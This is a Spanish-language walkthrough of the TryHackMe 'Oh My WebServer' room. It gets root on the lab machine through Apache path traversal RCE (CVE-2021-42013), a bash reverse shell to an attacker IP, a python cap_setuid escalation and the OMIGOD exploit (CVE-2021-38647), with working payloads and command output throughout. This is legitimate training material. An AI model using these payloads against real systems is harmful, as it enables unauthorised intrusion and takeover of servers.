---
title : "Oh My WebServer - Write Up - Español"
date : 2022-03-05T09:34:39+02:00
author : "Lanfran02"
cover : "cover.jpeg"
useRelativeCover : true
description : "Máquina de nivel medio en TryHackMe."
tags : ["CVE-2021-42013","RCE","Apache","Docker","OMIGOD","TryHackMe"]
---

| Link | Nivel | Creador |
|------|-------|---------|
| [Aquí](https://tryhackme.com/room/ohmyweb) | Medio | [tinyb0y](https://tryhackme.com/p/tinyb0y)  |

## Reconocimiento
¡Ey! ¡Bienvenido de nuevo!

Una vez más estamos ejecutando `nmap` contra esta máquina, ¡para ver qué servicios se están ejecutando!

```bash
└──╼ $sudo nmap -sS -sV -sC --min-rate 5000 10.10.239.45 -Pn -n
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-05 15:13 CET
Nmap scan report for 10.10.239.45
Host is up (0.13s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)
|   256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)
|_  256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
|_http-title: Consult - Business Consultancy Agency Template | Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Una máquina normal, con solo 2 puertos comunes abiertos...

Pero una cosa que nos llamó la atención:
El servidor web (Puerto 80) se ejecuta en `apache/2.4.49`.
¡Para esa versión tenemos un CVE-2021-42013! Puede encontrar más información al respecto [aquí](https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013).

Solo para confirmar la versión, hicimos una simple solicitud `curl` a la máquina, para verificar el encabezado `Servidor`.
```bash
└──╼ $curl -v http://10.10.239.45 | head
*   Trying 10.10.239.45:80...
 GET / HTTP/1.1
 Host: 10.10.239.45
 User-Agent: curl/7.74.0
 Accept: */* 

* Mark bundle as not supporting multiuse
HTTP/1.1 200 OK
Date: Sat, 05 Mar 2022 14:16:00 GMT
Server: Apache/2.4.49 (Unix)
Last-Modified: Wed, 23 Feb 2022 05:40:45 GMT
ETag: "e281-5d8a8e82e3140"
Accept-Ranges: bytes
Content-Length: 57985
Content-Type: text/html
```
Y para verificar el posible exploit, revisamos la carpeta `cgi-bin`.

```bash
└──╼ $curl http://10.10.239.45/cgi-bin/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
</body></html>
```
¡Y está activo!
¡Entonces podemos ejecutar el exploit y probar suerte!

```bash
└──╼ $curl 'http://10.10.239.45/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; whoami && pwd && id' -H "Content-Type: text/plain"
daemon
/bin
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```
¡Si! ¡Tenemos `RCE`!

## Acceso inicial - Usuario

Para obtener una `shell reversa` usamos 2 terminales. La primera está haciendo una solicitud con el exploit y la segunda está esperando la conexión.
```bash
=====Terminal 1======

└──╼ $curl 'http://10.10.239.45/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/10.9.1.30/1337 0>&1' -H "Content-Type: text/plain"


=====Terminal 2======

└──╼ $nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.9.1.30] from (UNKNOWN) [10.10.239.45] 40344
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
daemon@4a70924bafa0:/bin$ id;whoami;pwd
id;whoami;pwd
uid=1(daemon) gid=1(daemon) groups=1(daemon)
daemon
/bin
daemon@4a70924bafa0:/bin$

```

¡Y estamos dentro! Pero estamos ejecutando como un `daemon`, por lo que no podemos obtener la `bandera de usuario` :/

Al enumerar la máquina, descubrimos que el binario `python3.7` tiene la capacidad `cap_setuid` establecida. (Puede obtener más información sobre cómo explotar esto con [GTFOBIN](https://gtfobins.github.io/gtfobins/python/#capabilities)).

```bash
daemon@4a70924bafa0:/bin$ getcap -r / 2>/dev/null
/usr/bin/python3.7 = cap_setuid+ep

daemon@4a70924bafa0:/bin$ python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id
uid=0(root) gid=1(daemon) groups=1(daemon)
# cat /root/user.txt
THM{[REDACTADO]}
```
¡Sí! ¡Ahora somos root dentro de un contenedor `docker` y podemos enviar el indicador de usuario!

## Root

Después de enumerar _bastante_ la máquina, simplemente supusimos que tal vez haya otra máquina (en este caso, el host de los contenedores) en la IP adyacente. Básicamente, que el host está en `172.17.0.1`, ya que somos la `172.17.0.2`

```bash
root@4a70924bafa0:/tmp# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 3122  bytes 383708 (374.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2172  bytes 2759329 (2.6 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2  bytes 100 (100.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2  bytes 100 (100.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
Para confirmar esta suposición, cargamos un binario estático de `nmap` desde nuestra máquina. Puede descargarlo desde [aquí](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap).
Y lo ejecutamos contra la IP del supuesto Host.
```bash
root@4a70924bafa0:/tmp# ./nmap 172.17.0.1 -p- --min-rate 5000

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-03-05 14:48 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.0014s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown
MAC Address: 02:42:1A:89:70:8B (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 39.82 seconds
```
¡Sí! ¡Teníamos razón!
¡Y tenemos algunos puertos abiertos!

Buscando en Google `exploit del servicio del puerto 5986`, encontramos este POC:

https://github.com/AlteredSecurity/CVE-2021-38647

Este exploit es contra el servicio `OHMIGOD`, que comúnmente se ejecuta en puertos como `5986`.

¡Descargué el exploit en la máquina de la víctima y traté de explotarlo!

```bash
root@4a70924bafa0:/tmp# python3 exp.py -t 172.17.0.1 -c 'whoami;pwd;id;hostname;uname -a;cat /root/root.txt;'
root
/var/opt/microsoft/scx/tmp
uid=0(root) gid=0(root) groups=0(root)
ubuntu
Linux ubuntu 5.4.0-88-generic #99-Ubuntu SMP Thu Sep 23 17:29:00 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
THM{[REDACTADO]}
```
¡Y hemos rooteado la máquina!

Eso es todo de mi parte, ¡espero que lo encuentre útil!